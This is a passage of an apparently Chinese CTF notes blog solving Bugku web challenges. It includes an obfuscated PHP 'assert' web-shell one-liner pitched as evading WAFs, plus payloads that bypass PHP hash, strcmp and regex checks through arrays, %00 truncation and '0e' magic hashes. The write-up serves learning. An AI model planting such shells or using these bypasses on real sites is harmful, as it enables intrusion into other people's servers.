class="line"><span class="number">16.</span>输入密码查看flag</span><br><span class="line">http:<span class="comment">//123.206.87.240:8002/baopo/</span></span><br><span class="line">目录提示使用爆破，<span class="number">5</span>位数密码？？？</span><br><span class="line">纯数字！！！</span><br><span class="line"></span><br><span class="line"><span class="number">17.</span>点击一百万次</span><br><span class="line"><span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">$(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  $(<span class="string">"#cookie"</span>)</span><br><span class="line">.mousedown(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.mouseup(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">  clicks++;</span><br><span class="line">  $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">  <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">观察得，若clicks &gt;= <span class="number">1000000</span> 则执行下面的提交表单，</span><br><span class="line">索性直接 post 好了</span><br><span class="line"></span><br><span class="line"><span class="number">18.</span>过狗一句话</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$poc = <span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1 = explode(<span class="string">"#"</span>,$poc);   </span><br><span class="line"><span class="comment">// explode(separator,string,limit) 函数把字符串打散为数组</span></span><br><span class="line">$poc_2 = $poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; </span><br><span class="line">$poc_2($_GET[<span class="string">'s'</span>]) </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</span><br><span class="line"><span class="comment">// 若assertion为字符串，则assertion将会被当做php代码执行，与eval()类似</span></span><br><span class="line">http:<span class="comment">//120.24.86.145:8010/?s=print_r(scandir('./'));</span></span><br><span class="line">print_r() 函数用于打印变量，以更容易理解的形式展示</span><br><span class="line">scandir(directory,sorting_order,context) 函数返回指定目录中的文件和目录的数组</span><br><span class="line">print_r(scandir(<span class="string">'./'</span>))  <span class="comment">// 打印所有目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Welcome to bugku</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line"><span class="comment">// file_get_contents() 把整个文件读入一个字符串中</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line"><span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">这个题遇到很多骚办法，暂时还不会做</span><br><span class="line">博客 ：https:<span class="comment">//blog.csdn.net/csu_vc/article/details/78375203</span></span><br><span class="line">   https:<span class="comment">//blog.csdn.net/yh1013024906/article/details/81087939</span></span><br><span class="line">php 伪协议</span><br><span class="line">php:<span class="comment">//filter</span></span><br><span class="line">php:<span class="comment">//input</span></span><br><span class="line"><span class="comment">// ROIS恰好也有这道题，暗示我多做题？？</span></span><br><span class="line"><span class="comment">// 构造序列化，注意类名Read</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Read();</span><br><span class="line">$a-&gt;file = <span class="string">"f1a9.php"</span>;</span><br><span class="line">$a = serialize($a);</span><br><span class="line">print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">$pass = unserialize($pass);</span><br><span class="line"><span class="keyword">echo</span> $pass;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 各种绕过</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);   <span class="comment">// 将URL解码</span></span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>]) </span><br><span class="line"><span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag); </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">先将 id URL编码 %<span class="number">6</span>d%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>%<span class="number">69</span>%<span class="number">6</span>e</span><br><span class="line">再用数组绕过sha1()</span><br><span class="line"></span><br><span class="line"><span class="comment"># linux</span></span><br><span class="line">linux基础问题</span><br><span class="line">得到一个压缩包，win下打不开，扔到kali解压后发现一个flag的文件，</span><br><span class="line">改权限<span class="number">777</span>，cat强行查看，发现flag，不过本意好像不是这样</span><br><span class="line">strings 命令(此命令相当牛逼，以后再仔细学)</span><br><span class="line"><span class="comment"># linux2</span></span><br><span class="line">同上。。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 宽带信息泄露</span></span><br><span class="line">题目给的是 conf.bin 文件，.bin 相当于一个万能后缀，无法直接确定</span><br><span class="line">打开看一下是二进制文件，题目强调的是宽带信息泄露,flag&#123;宽带用户名&#125;</span><br><span class="line">网上提示了一个工具 Routerpassview</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Javascript Tricks</span></span><br><span class="line"><span class="keyword">var</span> net = <span class="keyword">require</span>(<span class="string">'net'</span>);</span><br><span class="line">flag=<span class="string">'fake_flag'</span>;</span><br><span class="line"><span class="keyword">var</span> server = net.createServer(</span><br><span class="line"><span class="function"><span class="keyword">function</span><span class="params">(socket)</span> </span>&#123;</span><br><span class="line">socket.on(<span class="string">'data'</span>, (data) =&gt; &#123; </span><br><span class="line"><span class="comment">//m = data.toString().replace(/[\n\r]*$/, '');</span></span><br><span class="line">ok = <span class="keyword">true</span>;</span><br><span class="line">arr = data.toString().split(<span class="string">' '</span>);</span><br><span class="line">arr = arr.map(Number);</span><br><span class="line"><span class="keyword">if</span> (arr.length != <span class="number">5</span>)   <span class="comment">// arr长度为5</span></span><br><span class="line">ok = <span class="keyword">false</span>;</span><br><span class="line">arr1 = arr.slice(<span class="number">0</span>);  <span class="comment">// 抽取从0开始的所有字符</span></span><br><span class="line">arr1.sort();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)  <span class="comment">// 没有相同元素，正常ASCII码</span></span><br><span class="line"><span class="keyword">if</span> (arr1[i+<span class="number">1</span>] == arr1[i] || arr[i] &lt; <span class="number">0</span> || arr1[i+<span class="number">1</span>] &gt; <span class="number">127</span>)</span><br><span class="line">ok = <span class="keyword">false</span>;</span><br><span class="line">arr2 = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">arr2.push(arr1[i] + arr1[i+<span class="number">1</span>]);</span><br><span class="line">val = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">val = val * <span class="number">0x100</span> + arr2[i];  <span class="comment">// 0x100 = 256</span></span><br><span class="line"><span class="keyword">if</span> (val != <span class="number">0x23332333</span>)</span><br><span class="line">ok = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (ok)</span><br><span class="line">socket.write(flag+<span class="string">'\n'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">socket.write(<span class="string">'nope\n'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//socket.write('Echo server\r\n');</span></span><br><span class="line"><span class="comment">//socket.pipe(socket);</span></span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line">HOST = <span class="string">'0.0.0.0'</span></span><br><span class="line">PORT = <span class="number">8082</span></span><br><span class="line">server.listen(PORT, HOST); </span><br><span class="line"></span><br><span class="line">这里还要用到 netcat 简称 nc，又涨了波姿势</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># extract变量覆盖</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">extract(<span class="keyword">array</span>[,extract_rules,prefix)]  </span><br><span class="line"><span class="comment">// 数组键名作为变量名，数组键值作为变量值</span></span><br><span class="line"><span class="comment">// 后几个参数是解决新创建的变量与原变量的冲突问题的</span></span><br><span class="line"><span class="comment">// 就这个题来说，之前就有一个flag的变量了，此时GET一个flag进去就会把原flag的值覆盖掉</span></span><br><span class="line"><span class="comment">// 如果$flag这个文件不存在，file_get_contents($flag)将为空</span></span><br><span class="line"><span class="comment">// 此时只需传一个 shiyan&amp;flag 就解决了</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># strcmp比较字符串</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 比较两个字符串（区分大小写）正常规则：</span></span><br><span class="line">   如果 str1 小于 str2 返回 &lt; <span class="number">0</span>；如果大于返回 &gt; <span class="number">0</span>；如果相等，返回 <span class="number">0</span>。</span><br><span class="line"><span class="comment">// 如果传入的值不是字符串类型就将出故障，并 return 0</span></span><br><span class="line"><span class="comment">// 比如 传一个数组 a[] ? 这题就做完了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># urldecode二次编码绕过</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"not allowed!"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Access granted!"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">int ereg(string pattern, string string, <span class="keyword">array</span> [regs]); 区分大小写</span><br><span class="line">int eregi(string $pattern, string $string [, <span class="keyword">array</span> &amp;$regs]) 不区分大小写的正则表达式匹配</span><br><span class="line">题面已经给了思路，将 hackerDJ 进行二次 url 编码即可绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># md5()函数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">数组大法好，直接 username[]&amp;password[]=<span class="number">1</span>又轻松绕过 md5()</span><br><span class="line">原理：md5() 不能处理数组，md5(数组) 会返回 <span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组返回NULL绕过</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">数组又能直接绕过？？ =&gt;  password[]=<span class="number">1</span></span><br><span class="line">原理：</span><br><span class="line">ereg() 只能处理字符，传数组将返回 <span class="keyword">null</span>，</span><br><span class="line">三个等号的时候不会进行类型转换，所以 <span class="keyword">null</span>!==<span class="keyword">false</span></span><br><span class="line">strpos() 的参数同样不能是数组，返回依旧是 <span class="keyword">null</span>，同上</span><br><span class="line"></span><br><span class="line">%<span class="number">00</span> 截断：ereg()可以进行%<span class="number">00</span>截断，这样就能绕开正则匹配  =&gt;  password=<span class="number">1</span>%<span class="number">00</span>--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 弱类型整数大小比较绕过</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp) ? <span class="keyword">die</span>(<span class="string">"no numeric"</span>) : <span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">数组又能直接绕过？？</span><br><span class="line">is_numeric()判断变量是否为数字或数字字符串</span><br><span class="line">password=<span class="number">1445</span>%<span class="number">00</span> / password=<span class="number">1445</span>%<span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sha1()函数比较绕过</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">var_dump($_GET[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your password can not be your name!'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Login first!'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">sha1() 计算字符串的散列值</span><br><span class="line">数组又能直接绕过？？</span><br><span class="line">sha1() 函数无法处理数组类型，将报错并返回<span class="keyword">false</span>，<span class="keyword">false</span> === <span class="keyword">false</span>条件成立</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># md5加密相等绕过</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input a"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">PHP 在处理哈希字符串时，会利用 != / == 来对其进行比较，它把每个以“<span class="number">0</span>e”的哈希值都解释为<span class="number">0</span>。</span><br><span class="line">如果两个不同的密码经过哈希以后，哈希值都是以“<span class="number">0</span>e<span class="string">"开头的话，PHP将认为这两个哈希值相同。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">常见的payload:</span></span><br><span class="line"><span class="string">QNKCDZO</span></span><br><span class="line"><span class="string">0e830400451993494058024219903391</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s155964671a</span></span><br><span class="line"><span class="string">0e342768416822451524974117254469</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s214587387a</span></span><br><span class="line"><span class="string">0e848240448830537924465865611904</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s878926199a</span></span><br><span class="line"><span class="string">0e545993274517709034328855841020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s1091221200a</span></span><br><span class="line"><span class="string">0e940624217856561557816327384675</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s1885207154a</span></span><br><span class="line"><span class="string">0e509367213418206700842008763514</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s1836677006a</span></span><br><span class="line"><span class="string">0e481036490867661113260034900752</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s1184209335a</span></span><br><span class="line"><span class="string">0e072485820392773389523109082030</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s1665632922a</span></span><br><span class="line"><span class="string">0e731198061491163073197128363787</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s1502113478a</span></span><br><span class="line"><span class="string">0e861580163291561247404381396064</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s532378020a</span></span><br><span class="line"><span class="string">0e220463095855511507588041205815</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 十六进制与数字比较</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">error_reporting(0);</span></span><br><span class="line"><span class="string">function noother_says_correct($temp) &#123;</span></span><br><span class="line"><span class="string">$flag = 'flag&#123;test&#125;';</span></span><br><span class="line"><span class="string">$one = ord('1');  //ord() 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="string">$nine = ord('9');</span></span><br><span class="line"><span class="string">$number = '3735929054';</span></span><br><span class="line"><span class="string">for ($i = 0; $i &lt; strlen($number); $i++) &#123;</span></span><br><span class="line"><span class="string">$digit = ord($temp&#123;$i&#125;);</span></span><br><span class="line"><span class="string">if (($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine))</span></span><br><span class="line"><span class="string">return "</span>flase<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if($number == $temp)</span></span><br><span class="line"><span class="string">return $flag;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$temp = $_GET['password'];</span></span><br><span class="line"><span class="string">echo noother_says_correct($temp);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">转十六进制 0xdeadc0de 绕过，别忘了加 0x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># strpos数组绕过</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$flag = "</span>flag<span class="string">";</span></span><br><span class="line"><span class="string">if (isset ($_GET['ctf'])) &#123;</span></span><br><span class="line"><span class="string">if (@ereg ("</span>^[<span class="number">1</span><span class="number">-9</span>]+$<span class="string">", $_GET['ctf']) === FALSE)</span></span><br><span class="line"><span class="string">echo '必须输入数字才行';</span></span><br><span class="line"><span class="string">else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)</span></span><br><span class="line"><span class="string">die('Flag: '.$flag);</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">echo '骚年，继续努力吧啊~';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">数组又能直接绕过？？ ctf[]=&#123;#BIUBIUbiu&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ereg正则%00截断</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$flag = "</span>xxx<span class="string">";</span></span><br><span class="line"><span class="string">if (isset ($_GET['password'])) &#123;</span></span><br><span class="line"><span class="string">if (ereg ("</span>^[a-zA-Z0<span class="number">-9</span>]+$<span class="string">", $_GET['password']) === FALSE) &#123;</span></span><br><span class="line"><span class="string">echo 'You password must be alphanumeric';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123;</span></span><br><span class="line"><span class="string">if (strpos ($_GET['password'], '*-*') !== FALSE)</span></span><br><span class="line"><span class="string">die('Flag: ' . $flag);</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">echo('*-* have not been found');</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">echo 'Invalid password';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">1.数组绕过：password[]</span></span><br><span class="line"><span class="string">2.%00截断，再加上科学计数法  =&gt;  password=1e9%00*-*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 数字验证正则绕过</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">error_reporting(0);</span></span><br><span class="line"><span class="string">$flag = 'flag&#123;test&#125;';</span></span><br><span class="line"><span class="string">if ("</span>POST<span class="string">" == $_SERVER['REQUEST_METHOD']) &#123;</span></span><br><span class="line"><span class="string">$password = $_POST['password'];</span></span><br><span class="line"><span class="string">if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password))&#123;</span></span><br><span class="line"><span class="string">echo 'flag';</span></span><br><span class="line"><span class="string">exit;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">while (TRUE) &#123;</span></span><br><span class="line"><span class="string">$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';</span></span><br><span class="line"><span class="string">if (6 &gt; preg_match_all($reg, $password, $arr))</span></span><br><span class="line"><span class="string">break;</span></span><br><span class="line"><span class="string">$c = 0;</span></span><br><span class="line"><span class="string">$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line"><span class="string">foreach ($ps as $pt) &#123;</span></span><br><span class="line"><span class="string">if (preg_match("</span>/[[:$pt:]]+/<span class="string">", $password))</span></span><br><span class="line"><span class="string">$c += 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if ($c &lt; 3) break;</span></span><br><span class="line"><span class="string">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="string">if ("</span><span class="number">42</span><span class="string">" == $password) echo $flag;</span></span><br><span class="line"><span class="string">else echo 'Wrong password';</span></span><br><span class="line"><span class="string">exit;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span 